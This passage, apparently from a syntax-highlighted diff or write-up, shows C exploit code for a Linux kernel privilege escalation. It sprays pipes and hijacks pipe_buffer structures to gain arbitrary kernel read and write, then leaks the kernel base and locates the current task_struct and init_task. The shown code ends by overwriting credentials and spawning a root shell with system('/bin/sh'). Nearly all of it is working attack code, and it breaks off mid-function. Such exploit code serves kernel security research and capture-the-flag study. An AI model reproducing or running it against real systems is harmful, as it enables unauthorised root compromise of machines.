+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[snd_victim_idx][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>evil_pipe_buf,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;try find pipe 3 idx&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (i <span style="color:#ff79c6">==</span> origin_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> victim_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> snd_origin_idx <span style="color:#ff79c6">||</span>
+</span></span><span style="display:flex;"><span>        i <span style="color:#ff79c6">==</span> snd_victim_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> self_pipe_idx_2) {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    read(spray_pipe_fd[i][<span style="color:#bd93f9">0</span>], <span style="color:#ff79c6">&amp;</span>page_ptr, <span style="color:#ff79c6">sizeof</span>(page_ptr));
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// printf(&#34;page ptr: %#lx&#34;, (size_t)page_ptr);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (page_ptr <span style="color:#ff79c6">==</span> evil_pipe_buf.page) {
+</span></span><span style="display:flex;"><span>      self_pipe_idx_3 <span style="color:#ff79c6">=</span> i;
+</span></span><span style="display:flex;"><span>      log_info(<span style="color:#f1fa8c">&#34;Found self pipe 3: %d&#34;</span>, self_pipe_idx_3);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (self_pipe_idx_3 <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;FAILED to build a self-writing pipe 3!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;try hijack pipe 4 page to itself&#34;</span>);
+</span></span><span style="display:flex;"><span>  evil_pipe_buf.offset <span style="color:#ff79c6">=</span> TRD_PIPE_BUFS_SIZE;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf.len <span style="color:#ff79c6">=</span> TRD_PIPE_BUFS_SIZE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[snd_victim_idx][<span style="color:#bd93f9">1</span>], buffer,
+</span></span><span style="display:flex;"><span>        TRD_PIPE_BUFS_SIZE <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf));
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[snd_victim_idx][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>evil_pipe_buf,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;try find pipe 4 idx&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (i <span style="color:#ff79c6">==</span> origin_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> victim_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> snd_origin_idx <span style="color:#ff79c6">||</span>
+</span></span><span style="display:flex;"><span>        i <span style="color:#ff79c6">==</span> snd_victim_idx <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> self_pipe_idx_2 <span style="color:#ff79c6">||</span> i <span style="color:#ff79c6">==</span> self_pipe_idx_3) {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    read(spray_pipe_fd[i][<span style="color:#bd93f9">0</span>], <span style="color:#ff79c6">&amp;</span>page_ptr, <span style="color:#ff79c6">sizeof</span>(page_ptr));
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// printf(&#34;page ptr: %#lx&#34;, (size_t)page_ptr);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (page_ptr <span style="color:#ff79c6">==</span> evil_pipe_buf.page) {
+</span></span><span style="display:flex;"><span>      self_pipe_idx_4 <span style="color:#ff79c6">=</span> i;
+</span></span><span style="display:flex;"><span>      log_info(<span style="color:#f1fa8c">&#34;Found self pipe 4: %d&#34;</span>, self_pipe_idx_4);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (self_pipe_idx_4 <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;FAILED to build a self-writing pipe 4!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;find self rw pipe 2 3 4 successfully&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setup_evil_pipe</span>() {
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;set up 2 3 4 pipe buffer&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  memcpy(<span style="color:#ff79c6">&amp;</span>evil_pipe_buf_2, <span style="color:#ff79c6">&amp;</span>info_pipe_buf, <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_2));
+</span></span><span style="display:flex;"><span>  memcpy(<span style="color:#ff79c6">&amp;</span>evil_pipe_buf_3, <span style="color:#ff79c6">&amp;</span>info_pipe_buf, <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_3));
+</span></span><span style="display:flex;"><span>  memcpy(<span style="color:#ff79c6">&amp;</span>evil_pipe_buf_4, <span style="color:#ff79c6">&amp;</span>info_pipe_buf, <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_4));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_2.offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_2.len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xff8</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* hijack 3 -&gt; 4 */</span>
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_3.offset <span style="color:#ff79c6">=</span> TRD_PIPE_BUFS_SIZE <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">3</span>;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_3.len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// ?? 写4
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">// 因为写 pipe 时从 offset + len 开始写，就是写入3中
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  log_info(<span style="color:#f1fa8c">&#34;hijack pipe 3 to write pipe 4&#34;</span>);
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[self_pipe_idx_4][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>evil_pipe_buf_3,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_3));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_4.offset <span style="color:#ff79c6">=</span> TRD_PIPE_BUFS_SIZE;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_4.len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">pipe_arb_read</span>(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>page_to_read, <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>dst) {
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_2.offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_2.len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1ff8</span>;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_2.page <span style="color:#ff79c6">=</span> page_to_read;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* use 3 wrtite 4 to make 4-&gt;2 */</span>
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[self_pipe_idx_3][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>evil_pipe_buf_4,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_4));
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* use 4 write 2 */</span>
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[self_pipe_idx_4][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>evil_pipe_buf_2,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_2));
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[self_pipe_idx_4][<span style="color:#bd93f9">1</span>], temp_zero_buf,
+</span></span><span style="display:flex;"><span>        TRD_PIPE_BUFS_SIZE <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_2));
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* use 4 write 3 */</span>
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[self_pipe_idx_4][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>evil_pipe_buf_3,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_3));
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* read 2 */</span>
+</span></span><span style="display:flex;"><span>  read(spray_pipe_fd[self_pipe_idx_2][<span style="color:#bd93f9">0</span>], dst, <span style="color:#bd93f9">0xfff</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">pipe_arb_write</span>(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>page_to_write, <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>src, size_t len) {
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_2.page <span style="color:#ff79c6">=</span> page_to_write;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_2.offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  evil_pipe_buf_2.len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* use 3 wrtite 4 to make 4-&gt;2 */</span>
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[self_pipe_idx_3][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>evil_pipe_buf_4,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_4));
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* use 4 write 2 */</span>
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[self_pipe_idx_4][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>evil_pipe_buf_2,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_2));
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[self_pipe_idx_4][<span style="color:#bd93f9">1</span>], temp_zero_buf,
+</span></span><span style="display:flex;"><span>        TRD_PIPE_BUFS_SIZE <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_2));
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* use 4 write 3 */</span>
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[self_pipe_idx_4][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>evil_pipe_buf_3,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">sizeof</span>(evil_pipe_buf_3));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  write(spray_pipe_fd[self_pipe_idx_2][<span style="color:#bd93f9">1</span>], src, len);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>size_t <span style="color:#ff79c6">*</span>tsk_buf, current_task_page, current_task, parent_task, buf[<span style="color:#bd93f9">0x1000</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">info_leak</span>() {
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;info leak&#34;</span>);
+</span></span><span style="display:flex;"><span>  size_t <span style="color:#ff79c6">*</span>comm_addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  memset(buf, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;setup kernel arbitrary read &amp; write...&#34;</span>);
+</span></span><span style="display:flex;"><span>  setup_evil_pipe();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;leaking something by search memory&#34;</span>);
+</span></span><span style="display:flex;"><span>  vmemmap_base <span style="color:#ff79c6">=</span> (size_t)info_pipe_buf.page <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xfffffffff0000000</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// log_info(&#34;vmemmap_base: %#lx&#34;, vmemmap_base);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">// debug(&#34;vmemmap_base&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">for</span> (;;) {
+</span></span><span style="display:flex;"><span>    pipe_arb_read((<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>)(vmemmap_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">157</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x40</span>), buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (buf[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xffffffff81000000</span> <span style="color:#ff79c6">&amp;&amp;</span> ((buf[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xfff</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x070</span>)) {
+</span></span><span style="display:flex;"><span>      kernel_base <span style="color:#ff79c6">=</span> buf[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x070</span>;
+</span></span><span style="display:flex;"><span>      kernel_offset <span style="color:#ff79c6">=</span> kernel_base <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0xffffffff81000000</span>;
+</span></span><span style="display:flex;"><span>      printf(
+</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Found kernel base: %#lx</span><span style="color:#f1fa8c">\n\t\t</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;Kernel offset: %#lx&#34;</span>,
+</span></span><span style="display:flex;"><span>          kernel_base, kernel_offset);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    vmemmap_base <span style="color:#ff79c6">-=</span> <span style="color:#bd93f9">0x10000000</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;vmemmap_base: %#lx&#34;</span>, vmemmap_base);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;seek task_struct in memory...&#34;</span>);
+</span></span><span style="display:flex;"><span>  prctl(PR_SET_NAME, <span style="color:#f1fa8c">&#34;waterkernelpwn&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#bd93f9">1</span>; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    pipe_arb_read((<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>)(vmemmap_base <span style="color:#ff79c6">+</span> i <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x40</span>), buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    comm_addr <span style="color:#ff79c6">=</span> memmem(buf, <span style="color:#bd93f9">0xf00</span>, <span style="color:#f1fa8c">&#34;waterkernelpwn&#34;</span>, <span style="color:#bd93f9">14</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (comm_addr <span style="color:#ff79c6">&amp;&amp;</span> (comm_addr[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xffff888000000000</span>) <span style="color:#6272a4">/* task-&gt;cred */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (comm_addr[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xffff888000000000</span>)           <span style="color:#6272a4">/* task-&gt;real_cred */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (comm_addr[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">57</span>] <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xffff888000000000</span>)    <span style="color:#6272a4">/* task-&gt;read_parent */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (comm_addr[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">56</span>] <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xffff888000000000</span>)) { <span style="color:#6272a4">/* task-&gt;parent */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">/* task-&gt;read_parent */</span>
+</span></span><span style="display:flex;"><span>      parent_task <span style="color:#ff79c6">=</span> comm_addr[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">57</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">/* task_struct::ptraced */</span>
+</span></span><span style="display:flex;"><span>      current_task <span style="color:#ff79c6">=</span> comm_addr[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">50</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">2528</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      page_offset_base <span style="color:#ff79c6">=</span> (comm_addr[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">50</span>] <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xfffffffffffff000</span>) <span style="color:#ff79c6">-</span> i <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x1000</span>;
+</span></span><span style="display:flex;"><span>      page_offset_base <span style="color:#ff79c6">&amp;=</span> <span style="color:#bd93f9">0xfffffffff0000000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[+] Found task_struct on page: </span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,
+</span></span><span style="display:flex;"><span>             (<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>)(vmemmap_base <span style="color:#ff79c6">+</span> i <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x40</span>));
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[+] page_offset_base: </span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m%#lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,
+</span></span><span style="display:flex;"><span>             page_offset_base);
+</span></span><span style="display:flex;"><span>      printf(
+</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[34m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[*] current task_struct&#39;s addr: </span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#34;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f1fa8c">&#34;%#lx</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>,
+</span></span><span style="display:flex;"><span>          current_task);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">get_root_shell</span>(<span style="color:#8be9fd">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (getuid()) {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[31m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[x] Failed to get the root!</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#34;</span>);
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#bd93f9">5</span>);
+</span></span><span style="display:flex;"><span>    exit(EXIT_FAILURE);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[+] Successful to get the root. </span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[34m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[*] Execve root shell now...</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  system(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>  exit(EXIT_SUCCESS);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>size_t <span style="color:#50fa7b">direct_map_addr_to_page_addr</span>(size_t direct_map_addr) {
+</span></span><span style="display:flex;"><span>  size_t page_count;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  page_count <span style="color:#ff79c6">=</span> ((direct_map_addr <span style="color:#ff79c6">&amp;</span> (<span style="color:#ff79c6">~</span><span style="color:#bd93f9">0xfff</span>)) <span style="color:#ff79c6">-</span> page_offset_base) <span style="color:#ff79c6">/</span> <span style="color:#bd93f9">0x1000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> vmemmap_base <span style="color:#ff79c6">+</span> page_count <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x40</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">privilege_escalation_by_task_overwrite</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* finding the init_task, the final parent of every task */</span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[*] Seeking for init_task...&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (;;) {
+</span></span><span style="display:flex;"><span>    size_t ptask_page_addr <span style="color:#ff79c6">=</span> direct_map_addr_to_page_addr(parent_task);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    tsk_buf <span style="color:#ff79c6">=</span> (size_t <span style="color:#ff79c6">*</span>)((size_t)buf <span style="color:#ff79c6">+</span> (parent_task <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xfff</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pipe_arb_read((<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>)ptask_page_addr, buf);
+</span></span><span style="display:flex;"><span>    pipe_arb_read((<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>)(ptask_page_addr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x40</span>), <span style="color:#ff79c6">&amp;</span>buf[<span style="color:#bd93f9">512</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">/* task_struct::real_parent */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (parent_task <span style="color:#ff79c6">==</span> tsk_buf[<span style="color:#bd93f9">309</span>]) {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parent_task <span style="color:#ff79c6">=</span> tsk_buf[<span style="color:#bd93f9">309</span>];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  init_task <span style="color:#ff79c6">=</span> parent_task;
+</span></span><span style="display:flex;"><span>  init_cred <span style="color:#ff79c6">=</span> tsk_buf[<span style="color:#bd93f9">363</span>];
+</span></span><span style="display:flex;"><span>  init_nsproxy <span style="color:#ff79c6">=</span> tsk_buf[<span style="color:#bd93f9">377</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[+] Found init_task: </span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m0x%lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, init_task);
